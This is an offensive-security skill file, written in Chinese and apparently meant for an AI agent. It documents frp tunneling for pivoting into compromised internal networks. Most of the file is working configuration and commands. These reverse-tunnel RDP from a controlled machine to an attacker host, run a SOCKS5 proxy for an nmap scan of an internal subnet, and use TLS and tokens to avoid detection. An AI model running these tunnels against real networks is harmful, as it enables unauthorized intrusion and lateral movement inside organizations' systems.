---
name: frp-tunnel
description: frp: 客户端起 SOCKS5 打穿整个内网段。信号:内网穿透,隧道,启动服务端(攻击机),启动客户端(已控内网机),开启 TLS,防流量明文。
---

# frp

- 攻击大类:C32 隧道与内网穿透
- 上游仓库:https://github.com/fatedier/frp
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
# 从 Releases 下载对应平台二进制:https://github.com/fatedier/frp/releases
# 服务端 frps / 客户端 frpc,免安装
```

## 参数速查

| 参数 / 配置 | 说明 |
| --- | --- |
| `frps -c frps.toml` | 启动服务端(攻击机) |
| `frpc -c frpc.toml` | 启动客户端(已控内网机) |
| `[common] serverAddr / serverPort / token` | 客户端指向服务端,token 鉴权 |
| `[[proxies]] type="tcp" remotePort=6000` | 把内网 22 端口映到攻击机 6000 |
| `type="stcp"` / `type="xtcp"` | 点对点/加密隧道,不经服务端中转流量 |
| `type="tcp" plugin="socks5"` | 客户端直接起 SOCKS5 代理穿透内网 |
| `transport.tls.enable=true` | 开启 TLS,防流量明文 |

## 攻击场景 Playbook

### 基础反向隧道(内网 3389 → 攻击机 6000)

攻击机 frps.toml:
```toml
bindPort = 7000
auth.token = "strong-token-here"
```
已控机 frpc.toml:
```toml
serverAddr = "攻击机IP"
serverPort = 7000
auth.token = "strong-token-here"
[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 6000
```
```bash
frps -c frps.toml            # 攻击机
frpc -c frpc.toml            # 已控机
rdesktop 攻击机IP:6000       # 从攻击机直连内网 RDP
```

### 客户端起 SOCKS5 打穿整个内网段

```toml
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
plugin = "socks5"
```
```bash
proxychains nmap -sT -p 1-1000 10.0.0.0/24
```

## 注意事项

隧道配 token + TLS 防被第三方接管或识别;多目标场景给每个已控机配独立 remotePort;大流量走 stcp 模式减轻服务端带宽。
